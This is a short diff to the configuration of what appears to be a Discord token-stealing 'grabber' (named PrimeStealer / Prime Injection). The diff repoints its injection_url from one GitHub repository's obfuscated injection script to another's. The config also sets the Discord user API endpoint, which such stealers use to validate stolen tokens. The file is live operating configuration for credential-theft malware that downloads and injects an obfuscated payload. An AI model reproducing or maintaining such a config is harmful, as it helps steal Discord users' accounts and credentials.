@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Prime Injection', 
   embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg', 
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Primelus/Prime-Grabber-Injection/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
